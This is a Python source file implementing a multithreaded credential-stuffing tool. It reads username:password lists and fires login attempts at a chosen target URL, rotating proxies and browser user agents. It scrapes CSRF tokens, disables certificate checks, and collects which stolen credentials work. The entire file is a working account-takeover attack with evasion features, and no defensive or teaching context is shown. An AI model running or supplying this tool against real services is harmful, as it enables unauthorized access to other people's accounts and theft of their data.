import requests
import json
import time
import random
import threading
import queue
from bs4 import BeautifulSoup

class CredentialStuffingScanner:
    def __init__(self):
        self.options = {
            "TARGET_URL": "",
            "USERNAME_FIELD": "username",
            "PASSWORD_FIELD": "password",
            "SUBMIT_FIELD": "submit",
            "METHOD": "POST",
            "SUCCESS_INDICATOR": "dashboard",
            "FAILURE_INDICATOR": "invalid",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "COOKIE": "",
            "DELAY": "1",
            "THREADS": "5",
            "TIMEOUT": "10",
            "CREDENTIALS_FILE": "",
            "PROXY_FILE": "",
            "RANDOMIZE_ORDER": True,
            "ROTATE_USER_AGENTS": True,
            "HANDLE_CSRF": False,
            "CAPTCHA_BYPASS": False,
            "RATE_LIMIT": "5",
            "RATE_LIMIT_TIME": "60",
            "SESSION_PERSISTENCE": False,
            "FOLLOW_REDIRECTS": True,
            "VERIFY_SSL": False
        }
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.3 Safari/605.1.15"
        ]
        
        self.credentials = []
        self.proxies = []
        self.results = []
        self.rate_limit_counter = 0
        self.rate_limit_time_start = time.time()
        self.lock = threading.Lock()
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def load_credentials(self):
        try:
            with open(self.get_option("CREDENTIALS_FILE"), "r") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        username, password = line.split(":", 1)
                        self.credentials.append({"username": username, "password": password})
            
            if self.get_option("RANDOMIZE_ORDER"):
                random.shuffle(self.credentials)
            
            return True
        except Exception:
            return False
    
    def load_proxies(self):
        try:
            with open(self.get_option("PROXY_FILE"), "r") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        self.proxies.append(line)
            
            return True
        except Exception:
            return False
    
    def get_csrf_token(self, session, url):
        try:
            response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=self.get_option("VERIFY_SSL"))
            soup = BeautifulSoup(response.text, 'html.parser')
            
            csrf_token = None
            
            for input_tag in soup.find_all('input'):
                if input_tag.get('type') == 'hidden' and (
                    'csrf' in input_tag.get('name', '').lower() or 
                    'token' in input_tag.get('name', '').lower()
                ):
                    csrf_token = input_tag.get('value')
                    break
            
            return csrf_token
        except Exception:
            return None
    
    def check_rate_limit(self):
        rate_limit = int(self.get_option("RATE_LIMIT"))
        rate_limit_time = int(self.get_option("RATE_LIMIT_TIME"))
        
        with self.lock:
            current_time = time.time()
            
            if current_time - self.rate_limit_time_start > rate_limit_time:
                self.rate_limit_counter = 0
                self.rate_limit_time_start = current_time
            
            if self.rate_limit_counter >= rate_limit:
                sleep_time = rate_limit_time - (current_time - self.rate_limit_time_start)
                if sleep_time > 0:
                    time.sleep(sleep_time)
                self.rate_limit_counter = 0
                self.rate_limit_time_start = time.time()
            
            self.rate_limit_counter += 1
    
    def worker(self, task_queue):
        session = requests.Session()
        
        if self.get_option("SESSION_PERSISTENCE"):
            session.headers.update({"User-Agent": self.get_option("USER_AGENT")})
            
            if self.get_option("COOKIE"):
                session.headers.update({"Cookie": self.get_option("COOKIE")})
            
            if self.get_option("HEADERS"):
                try:
                    for header in self.get_option("HEADERS").split("\\n"):
                        if ":" in header:
                            key, value = header.split(":", 1)
                            session.headers[key.strip()] = value.strip()
                except:
                    pass
        
        while not task_queue.empty():
            try:
                credential = task_queue.get()
                
                if not self.get_option("SESSION_PERSISTENCE"):
                    session = requests.Session()
                    
                    if self.get_option("ROTATE_USER_AGENTS"):
                        user_agent = random.choice(self.user_agents)
                        session.headers.update({"User-Agent": user_agent})
                    else:
                        session.headers.update({"User-Agent": self.get_option("USER_AGENT")})
                    
                    if self.get_option("COOKIE"):
                        session.headers.update({"Cookie": self.get_option("COOKIE")})
                    
                    if self.get_option("HEADERS"):
                        try:
                            for header in self.get_option("HEADERS").split("\\n"):
                                if ":" in header:
                                    key, value = header.split(":", 1)
                                    session.headers[key.strip()] = value.strip()
                        except:
                            pass
                
                if self.proxies:
                    proxy = random.choice(self.proxies)
                    proxies = {
                        "http": proxy,
                        "https": proxy
                    }
                else:
                    proxies = None
                
                self.check_rate_limit()
                
                if self.get_option("HANDLE_CSRF"):
                    csrf_token = self.get_csrf_token(session, self.get_option("TARGET_URL"))
                
                data = {
                    self.get_option("USERNAME_FIELD"): credential["username"],
                    self.get_option("PASSWORD_FIELD"): credential["password"]
                }
                
                if self.get_option("HANDLE_CSRF") and csrf_token:
                    data["csrf_token"] = csrf_token
                
                if self.get_option("SUBMIT_FIELD"):
                    data[self.get_option("SUBMIT_FIELD")] = "Login"
                
                if self.get_option("METHOD") == "POST":
                    response = session.post(
                        self.get_option("TARGET_URL"),
                        data=data,
                        timeout=int(self.get_option("TIMEOUT")),
                        verify=self.get_option("VERIFY_SSL"),
                        proxies=proxies,
                        allow_redirects=self.get_option("FOLLOW_REDIRECTS")
                    )
                else:
                    response = session.get(
                        self.get_option("TARGET_URL"),
                        params=data,
                        timeout=int(self.get_option("TIMEOUT")),
                        verify=self.get_option("VERIFY_SSL"),
                        proxies=proxies,
                        allow_redirects=self.get_option("FOLLOW_REDIRECTS")
                    )
                
                success_indicator = self.get_option("SUCCESS_INDICATOR").lower()
                failure_indicator = self.get_option("FAILURE_INDICATOR").lower()
                
                if success_indicator and success_indicator in response.text.lower():
                    result = {
                        "username": credential["username"],
                        "password": credential["password"],
                        "status": "success",
                        "response_code": response.status_code,
                        "response_length": len(response.text)
                    }
                    with self.lock:
                        self.results.append(result)
                elif failure_indicator and failure_indicator in response.text.lower():
                    result = {
                        "username": credential["username"],
                        "password": credential["password"],
                        "status": "failed",
                        "response_code": response.status_code,
                        "response_length": len(response.text)
                    }
                    with self.lock:
                        self.results.append(result)
                else:
                    result = {
                        "username": credential["username"],
                        "password": credential["password"],
                        "status": "unknown",
                        "response_code": response.status_code,
                        "response_length": len(response.text)
                    }
                    with self.lock:
                        self.results.append(result)
                
                if self.get_option("DELAY") and int(self.get_option("DELAY")) > 0:
                    time.sleep(int(self.get_option("DELAY")))
                
                task_queue.task_done()
            except Exception:
                task_queue.task_done()
    
    def run(self):
        if not self.load_credentials():
            return {
                "success": False,
                "message": "Failed to load credentials file"
            }
        
        if self.get_option("PROXY_FILE"):
            self.load_proxies()
        
        task_queue = queue.Queue()
        
        for credential in self.credentials:
            task_queue.put(credential)
        
        threads = []
        num_threads = int(self.get_option("THREADS"))
        
        for i in range(num_threads):
            thread = threading.Thread(target=self.worker, args=(task_queue,))
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
        
        successful_logins = [result for result in self.results if result["status"] == "success"]
        
        if successful_logins:
            return {
                "success": True,
                "message": f"Found {len(successful_logins)} successful logins",
                "results": self.results,
                "successful_logins": successful_logins
            }
        else:
            return {
                "success": True,
                "message": "No successful logins found",
                "results": self.results
            }
